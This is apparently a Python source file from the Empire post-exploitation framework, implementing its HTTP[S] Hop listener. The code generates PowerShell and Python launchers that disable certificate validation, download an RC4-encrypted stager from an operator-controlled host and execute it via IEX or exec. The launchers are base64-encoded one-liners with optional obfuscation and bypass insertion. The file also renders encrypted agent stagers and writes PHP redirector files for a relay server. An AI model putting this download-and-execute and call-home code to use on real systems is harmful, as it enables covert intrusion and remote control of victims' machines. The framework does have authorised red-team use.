import base64
import errno
import logging
import os
import random
from textwrap import dedent

from empire.server.common import encryption, helpers, packets, templating
from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.utils import data_util, listener_util

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)


class Listener:
    def __init__(self, mainMenu: MainMenu):
        self.info = {
            "Name": "HTTP[S] Hop",
            "Authors": [
                {
                    "Name": "Will Schroeder",
                    "Handle": "@harmj0y",
                    "Link": "https://twitter.com/harmj0y",
                }
            ],
            "Description": ("Starts a http[s] listener that uses a GET/POST approach."),
            "Category": ("client_server"),
            "Comments": [],
            "Software": "",
            "Techniques": [],
            "Tactics": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "http_hop",
            },
            "RedirectListener": {
                "Description": "Existing listener to redirect the hop traffic to.",
                "Required": True,
                "Value": "",
            },
            "Launcher": {
                "Description": "Launcher string.",
                "Required": True,
                "Value": "powershell -noP -sta -w 1 -enc ",
            },
            "RedirectStagingKey": {
                "Description": "The staging key for the redirect listener, extracted from RedirectListener automatically.",
                "Required": False,
                "Value": "",
            },
            "Host": {
                "Description": "Hostname/IP for staging.",
                "Required": True,
                "Value": "",
            },
            "Port": {
                "Description": "Port for the listener.",
                "Required": True,
                "Value": "80",
                "SuggestedValues": ["80", "443"],
            },
            "DefaultProfile": {
                "Description": "Default communication profile for the agent, extracted from RedirectListener automatically.",
                "Required": False,
                "Value": "",
            },
            "OutFolder": {
                "Description": "Folder to output redirectors to.",
                "Required": True,
                "Value": "/tmp/http_hop/",
            },
            "SlackURL": {
                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
                "Required": False,
                "Value": "",
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.thread = None

        self.instance_log = log

    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        return ""

    def validate_options(self) -> tuple[bool, str | None]:
        """
        Validate all options for this listener.
        """

        return True, None

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscation_command="",
        userAgent="default",
        proxy="default",
        proxyCreds="default",
        stagerRetries="0",
        language=None,
        safeChecks="",
        listenerName=None,
        bypasses: list[str] | None = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses

        if not language:
            log.error("listeners/http_hop generate_launcher(): no language specified!")
            return None

        active_listener = self
        # extract the set options for this instantiated listener
        listenerOptions = active_listener.options

        host = listenerOptions["Host"]["Value"]
        launcher = listenerOptions["Launcher"]["Value"]
        staging_key = listenerOptions["RedirectStagingKey"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        uris = list(profile.split("|")[0].split(","))
        stage0 = random.choice(uris)

        if language == "powershell":
            # PowerShell

            stager = '$ErrorActionPreference = "SilentlyContinue";'
            if safeChecks.lower() == "true":
                stager = "If($PSVersionTable.PSVersion.Major -ge 3){"

                for bypass in bypasses:
                    stager += bypass
                stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"

            stager += "$wc=New-Object System.Net.WebClient;"

            if userAgent.lower() == "default":
                userAgent = profile.split("|")[1]
            stager += f"$u='{ userAgent }';"

            if "https" in host:
                # allow for self-signed certificates for https connections
                stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

            if userAgent.lower() != "none" or proxy.lower() != "none":
                if userAgent.lower() != "none":
                    stager += "$wc.Headers.Add('User-Agent',$u);"

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        stager += "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"

                    else:
                        # TODO: implement form for other proxy
                        stager += "$proxy=New-Object Net.WebProxy;"
                        stager += f"$proxy.Address = '{ proxy.lower() }';"
                        stager += "$wc.Proxy = $proxy;"

                    if proxyCreds.lower() == "default":
                        stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                    else:
                        # TODO: implement form for other proxy credentials
                        username = proxyCreds.split(":")[0]
                        password = proxyCreds.split(":")[1]
                        domain = username.split("\\")[0]
                        usr = username.split("\\")[1]
                        stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}', '{domain}');"
                        stager += "$wc.Proxy.Credentials = $netcred;"

            # TODO: reimplement stager retries?

            # code to turn the key string into a byte array
            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"

            # this is the minimized RC4 stager code from rc4.ps1
            stager += listener_util.powershell_rc4()

            # prebuild the request routing packet for the launcher
            routingPacket = packets.build_routing_packet(
                staging_key,
                sessionID="00000000",
                language="POWERSHELL",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")

            # add the RC4 packet to a cookie
            stager += f'$wc.Headers.Add("Cookie","session={ b64RoutingPacket }");'
            stager += f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';$hop='{ listenerName }';"
            stager += "$data=$wc.DownloadData($ser+$t);"
            stager += "$iv=$data[0..3];$data=$data[4..$data.length];"

            # decode everything and kick it over to IEX to kick off execution
            stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"

            # Remove comments and make one line
            stager = helpers.strip_powershell_comments(stager)
            stager = data_util.ps_convert_to_oneliner(stager)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager,
                    obfuscation_command=obfuscation_command,
                )

            # base64 encode the stager and return it
            if encode and (
                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
            ):
                return helpers.powershell_launcher(stager, launcher)
            # otherwise return the case-randomized stager
            return stager

        if language in ["python", "ironpython"]:
            # Python

            launcherBase = "import sys;"
            if "https" in host:
                # monkey patch ssl woohooo
                launcherBase += dedent(
                    """
                    import ssl;
                    if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
                    """
                )
            try:
                if safeChecks.lower() == "true":
                    launcherBase += listener_util.python_safe_checks()
            except Exception as e:
                p = f"{listenerName}: Error setting LittleSnitch in stager: {e!s}"
                log.error(p)

            if userAgent.lower() == "default":
                userAgent = profile.split("|")[1]

            launcherBase += dedent(
                f"""
                import urllib.request;
                UA='{ userAgent }';server='{ host }';t='{ stage0 }';hop='{ listenerName }';
                req=urllib.request.Request(server+t);
                """
            )

            # prebuild the request routing packet for the launcher
            routingPacket = packets.build_routing_packet(
                staging_key,
                sessionID="00000000",
                language="PYTHON",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")

            if proxy.lower() != "none":
                if proxy.lower() == "default":
                    launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                else:
                    proto = proxy.split(":")[0]
                    launcherBase += f"proxy = urllib.request.ProxyHandler({{'{ proto }':'{ proxy }'}});\n"

                if proxyCreds != "none":
                    if proxyCreds == "default":
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"

                        # add the RC4 packet to a cookie
                        launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={ b64RoutingPacket }")];\n'
                    else:
                        username = proxyCreds.split(":")[0]
                        password = proxyCreds.split(":")[1]
                        launcherBase += dedent(
                            f"""
                            proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
                            proxy_auth_handler.add_password(None,'{ proxy }','{ username }','{ password }');
                            o = urllib.request.build_opener(proxy, proxy_auth_handler);
                            o.addheaders=[('User-Agent',UA), ("Cookie", "session={ b64RoutingPacket }")];
                            """
                        )
                else:
                    launcherBase += "o = urllib.request.build_opener(proxy);\n"
            else:
                launcherBase += "o = urllib.request.build_opener();\n"

            # install proxy and creds globally, so they can be used with urlopen.
            launcherBase += "urllib.request.install_opener(o);\n"
            launcherBase += "a=urllib.request.urlopen(req).read();\n"

            # download the stager and extract the IV
            launcherBase += listener_util.python_extract_stager(staging_key)

            if obfuscate:
                launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                    launcherBase
                )

            if encode:
                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                    "UTF-8"
                )
                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
            return launcherBase

        log.error(
            "listeners/http_hop generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
        )
        return None

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscation_command="",
        language=None,
    ):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        if not language:
            log.error("listeners/http generate_stager(): no language specified!")
            return None

        with SessionLocal.begin() as db:
            listener = self.mainMenu.listenersv2.get_by_name(
                db, listenerOptions["RedirectListener"]["Value"]
            )

            profile = listener.options["DefaultProfile"]["Value"]
            uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
            staging_key = listener.options["StagingKey"]["Value"]
            workingHours = listener.options["WorkingHours"]["Value"]
            killDate = listener.options["KillDate"]["Value"]
            host = listenerOptions["Host"]["Value"]
            customHeaders = profile.split("|")[2:]
            session_cookie = ""

        # select some random URIs for staging from the main profile
        stage1 = random.choice(uris)
        stage2 = random.choice(uris)

        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.ps1")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": staging_key,
                "profile": profile,
                "session_cookie": session_cookie,
                "host": host,
                "stage_1": stage1,
                "stage_2": stage2,
            }
            stager = template.render(template_options)

            # make sure the server ends with "/"
            if not host.endswith("/"):
                host += "/"

            # Patch in custom Headers
            remove = []
            if customHeaders != []:
                for key in customHeaders:
                    value = key.split(":")
                    if "cookie" in value[0].lower() and value[1]:
                        continue
                    remove += value
                headers = ",".join(remove)
                stager = stager.replace(
                    '$customHeaders = "";', f'$customHeaders = "{ headers }";'
                )

            staging_key = staging_key.encode("UTF-8")
            stager = listener_util.remove_lines_comments(stager)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager, obfuscation_command=obfuscation_command
                )

            # base64 encode the stager and return it
            # There doesn't seem to be any conditions in which the encrypt flag isn't set so the other
            # if/else statements are irrelevant
            if encode:
                return helpers.enc_powershell(stager)
            if encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(
                    RC4IV + staging_key, stager.encode("UTF-8")
                )
            return stager

        if language in ["python", "ironpython"]:
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.py")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": staging_key,
                "profile": profile,
                "session_cookie": session_cookie,
                "host": host,
                "stage_1": stage1,
                "stage_2": stage2,
            }
            stager = template.render(template_options)

            # base64 encode the stager and return it
            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager,
                    obfuscation_command=obfuscation_command,
                )

            if encode:
                return base64.b64encode(stager)
            if encrypt:
                # return an encrypted version of the stager ("normal" staging)
                RC4IV = os.urandom(4)

                return RC4IV + encryption.rc4(
                    RC4IV + staging_key.encode("UTF-8"), stager.encode("UTF-8")
                )
            # otherwise return the standard stager
            return stager

        log.error(
            "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
        )
        return None

    def generate_agent(
        self, listenerOptions, language=None, obfuscate=False, obfuscation_command=""
    ):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        log.error("generate_agent() not implemented for listeners/http_hop")
        return ""

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """
        host = listenerOptions["Host"]["Value"]

        if not language:
            log.error("listeners/http_hop generate_comms(): no language specified!")
            return None

        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.ps1")

            template_options = {
                "session_cookie": "",
                "host": host,
            }

            return template.render(template_options)

        if language.lower() == "python":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/comms.py")

            template_options = {
                "session_cookie": "",
                "host": host,
            }

            return template.render(template_options)

        log.error(
            "listeners/http_hop generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
        )
        return None

    def start(self):
        """
        Nothing to actually start for a hop listner, but ensure the stagingKey is
        synced with the redirect listener.
        """

        redirectListenerName = self.options["RedirectListener"]["Value"]
        redirectListenerOptions = data_util.get_listener_options(redirectListenerName)

        if not redirectListenerOptions:
            log.error(
                f"Redirect listener name {redirectListenerName} not a valid listener!"
            )
            return False

        self.options["RedirectStagingKey"]["Value"] = redirectListenerOptions.options[
            "StagingKey"
        ]["Value"]
        self.options["DefaultProfile"]["Value"] = redirectListenerOptions.options[
            "DefaultProfile"
        ]["Value"]
        redirectHost = redirectListenerOptions.options["Host"]["Value"]

        uris = list(self.options["DefaultProfile"]["Value"].split("|")[0].split(","))

        hopCodeLocation = f"{self.mainMenu.installPath}/data/misc/hop.php"
        with open(hopCodeLocation) as f:
            hopCode = f.read()

        hopCode = hopCode.replace("REPLACE_SERVER", redirectHost)
        hopCode = hopCode.replace("REPLACE_HOP_NAME", self.options["Name"]["Value"])

        saveFolder = self.options["OutFolder"]["Value"]
        for uri in uris:
            saveName = f"{saveFolder}{uri}"

            # recursively create the file's folders if they don't exist
            if not os.path.exists(os.path.dirname(saveName)):
                try:
                    os.makedirs(os.path.dirname(saveName))
                except OSError as exc:  # Guard against race condition
                    if exc.errno != errno.EEXIST:
                        raise

            with open(saveName, "w") as f:
                f.write(hopCode)
                log.info(
                    f"Hop redirector written to {saveName} . Place this file on the redirect server."
                )

        return True

    def shutdown(self, name=""):
        """
        Nothing to actually shut down for a hop listener.
        """
        pass
